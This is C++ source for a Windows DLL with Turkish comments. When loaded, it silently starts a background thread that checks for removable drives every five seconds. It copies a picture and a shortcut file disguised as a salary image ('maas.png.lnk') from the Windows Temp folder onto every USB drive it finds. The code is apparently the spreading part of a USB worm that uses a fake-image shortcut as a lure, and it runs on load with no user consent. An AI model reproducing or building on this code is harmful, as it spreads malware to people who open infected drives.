#include <windows.h>
#include <tchar.h>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <iostream> // Debug için

// USB sürücülerini algýlayýp listeleyecek fonksiyon
std::vector<std::wstring> GetUsbDrives() {
    std::vector<std::wstring> usbDrives;
    TCHAR szDrive[] = _T("A:\\\\");

    // Sürücüleri A: Z: arasý kontrol et
    for (int i = 0; i < 26; i++) {
        szDrive[0] = 'A' + i;
        DWORD dwAttrib = GetFileAttributes(szDrive);

        // Eðer geçerli bir sürücü ve dizinse
        if (dwAttrib != INVALID_FILE_ATTRIBUTES && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY)) {
            // Sadece USB sürücüsünü kontrol et
            if (GetDriveType(szDrive) == DRIVE_REMOVABLE) {
                usbDrives.push_back(szDrive);
            }
        }
    }

    return usbDrives;
}

// Dosya kopyalama fonksiyonu (dosyayý USB sürücüsüne kopyalar)
bool CopyFileToUsbDrive(const std::wstring& usbDrive, const std::wstring& filePath, const std::wstring& fileName) {
    if (filePath.empty()) {
        std::wcerr << fileName << L" bulunamadý!" << std::endl;
        return false;
    }

    // USB'deki hedef yol
    std::wstring destPath = usbDrive + L"\\\\" + fileName;

    // Dosya kopyalama iþlemi
    bool success = CopyFile(filePath.c_str(), destPath.c_str(), FALSE);
    if (!success) {
        std::wcerr << fileName << L" kopyalama hatasý: " << GetLastError() << std::endl;
    }

    return success;
}

// Dosyanýn var olup olmadýðýný kontrol etme
bool IsFilePresent(const std::wstring& usbDrive, const std::wstring& fileName) {
    std::wstring destPath = usbDrive + L"\\\\" + fileName;
    return GetFileAttributes(destPath.c_str()) != INVALID_FILE_ATTRIBUTES;
}

// Dosyanýn bulunduðu yolu belirleme fonksiyonu
std::wstring FindFile(const std::wstring& fileName) {
    // Dosya C:\\Windows\\Temp altýnda aranacak
    std::wstring tempPath = L"C:\\\\Windows\\\\Temp\\\\" + fileName;

    if (GetFileAttributes(tempPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        return tempPath;
    }

    // Dosya bulunamazsa boþ bir string döndür
    return L"";
}

// USB sürücülerini sürekli tarayýp dosya kopyalama iþlemi yapan fonksiyon
void MonitorUsbDrives() {
    const std::wstring fileNames[] = { L"image.png", L"maas.png.lnk" };

    while (true) {
        // USB sürücülerini al
        std::vector<std::wstring> usbDrives = GetUsbDrives();

        for (const auto& usbDrive : usbDrives) {
            bool allCopied = true;

            // Dosyalarý kopyala
            for (const auto& fileName : fileNames) {
                std::wstring filePath = FindFile(fileName);

                // Eðer dosya mevcut deðilse, tekrar kopyala
                if (!IsFilePresent(usbDrive, fileName)) {
                    if (!CopyFileToUsbDrive(usbDrive, filePath, fileName)) {
                        allCopied = false; // Eðer bir kopyalama baþarýsýzsa
                    }
                }
            }

            if (allCopied) {
                std::wcout << L"Tüm dosyalar " << usbDrive << L" sürücüsüne kopyalandý." << std::endl;
            }
        }

        // 5 saniye bekle (USB sürücülerini yeniden taramadan önce)
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

// DLL Entry Point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // USB sürücülerini sürekli taramak için MonitorUsbDrives fonksiyonunu baþlat
        std::thread monitorThread(MonitorUsbDrives);
        monitorThread.detach(); // Thread'i ayýrarak ana iþ parçacýðýndan baðýmsýz çalýþmasýný saðla
    }
    return TRUE;
}
